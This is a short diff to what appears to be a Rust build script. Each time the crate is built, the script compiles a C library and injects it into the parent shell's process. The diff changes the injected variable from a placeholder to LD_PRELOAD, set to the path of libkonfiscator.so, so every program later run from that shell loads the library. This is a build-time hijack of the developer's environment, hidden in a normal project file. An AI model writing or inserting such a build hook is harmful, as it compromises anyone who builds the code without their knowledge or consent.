@@ -36,12 +36,15 @@ fn main() {
 
     _exec(&format!("gcc {} {} -o {}", cflags, cfiles, cout), None).expect("Error invoking gcc");
 
+    let cargo_profile = env::var("PROFILE").expect("Cargo env var $PROFILE not defined");
+
     if let Ok(pppid) = _pppid() {
         _inject_env_var(
             pppid,
-            "HELLO_WORLD",
+            "LD_PRELOAD",
             &vec!["debug", "release"]
                 .iter()
+                .filter(|x| **x == cargo_profile)
                 .map(|x| format!("{}/target/{}/libkonfiscator.so", cwd.to_string_lossy(), x))
                 .collect::<Vec<String>>()
                 .join(","),
